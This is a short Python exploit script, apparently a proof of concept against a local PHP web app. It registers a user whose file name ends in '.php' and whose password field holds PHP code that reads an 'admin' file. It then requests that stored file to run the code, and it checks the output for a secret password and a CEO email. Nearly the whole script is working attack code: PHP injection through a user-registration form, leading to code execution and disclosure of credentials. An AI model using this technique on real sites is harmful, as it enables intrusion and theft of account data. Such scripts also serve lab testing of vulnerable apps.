import requests
EXPECTED = "secretPassword\nceo@proclive.comtest@test.com"
SESSION = requests.Session()
PATH_CREATE = 'http://localhost/site/data/user.php'
PHP = '<?php $file = file_get_contents(\'admin\', true); print $file ?>'
USER = {'username': 'exploitWork.php', 'email': 'test@test.com', 'password': PHP}
ACCOUNT = SESSION.post(PATH_CREATE, data=USER)

PATH_EXPLOIT = 'http://localhost/site/data/users/exploitWork.php'
ADMIN = SESSION.post(PATH_EXPLOIT)

if EXPECTED == ADMIN.text:
    print("Get Admin Info Success!")
else:
    print("Get Admin Info Fail")